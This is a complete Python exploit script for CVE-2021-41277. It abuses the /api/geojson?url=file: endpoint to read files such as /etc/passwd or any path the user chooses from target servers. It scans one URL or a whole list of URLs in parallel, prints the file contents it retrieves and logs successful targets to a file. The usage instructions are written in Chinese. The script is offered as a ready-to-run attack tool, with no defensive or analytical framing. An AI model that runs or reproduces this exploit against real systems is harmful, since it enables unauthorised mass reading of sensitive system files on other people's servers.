import requests
import warnings
import optparse
import os
from multiprocessing import Pool

warnings.filterwarnings('ignore')

class ReadFileDemo(object):
    def __init__(self):
        self.filepath="/etc/passwd"
        self.headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36"}
        self.timeout=3

    def exploit(self,url):
        self.urlpath = "/api/geojson?url=file:{}".format(self.filepath)
        url=url.rstrip("/")+self.urlpath
        try:
            rqt=requests.get(url,headers=self.headers,timeout=3,verify=False)
            if rqt.status_code==200:
                print("[+] CVE-2021-41277 OK url:{}".format(url))
                print("[+] CVE-2021-41277 OK url:{}".format(url),file=open("save.txt","a",encoding="utf-8"))
                print(rqt.text)
        except Exception as error:
            pass


if __name__ == '__main__':
    obj=ReadFileDemo()
    parser=optparse.OptionParser()
    parser.add_option("-u",dest="url",help="单个检测url")
    parser.add_option("-f",dest="file",help="批量检测")
    parser.add_option("-p",dest="path",help="指定要读取的文件路径")
    option,args=parser.parse_args()
    if option.url and option.path:
        if option.path!="default":
            obj.filepath=option.path
        obj.exploit(option.url)
    elif option.file and option.path:
        if option.path!="default":
            obj.filepath=option.path
        if os.path.exists(option.file):
            urllist=open(option.file,"r",encoding="utf-8").read().split("\n")
            P=Pool()
            P.map(obj.exploit,urllist)
        else:
            print("[-] File:{} Not Found".format(option.file))
    else:
        print("Example:\n"
              "python exploit.py -u <url> -p default #默认读取/etc/passwd\n"
              "python exploit.py -f <filepath> -p default #批量检测，默认读取/etc/passwd\n"
              "python exploit.py -u <url> -p /porc/version #读取指定文件\n"
              "python exploit.py -f <filepath> -p /proc/version #批量检测，读取指定文件\n")
        parser.print_help()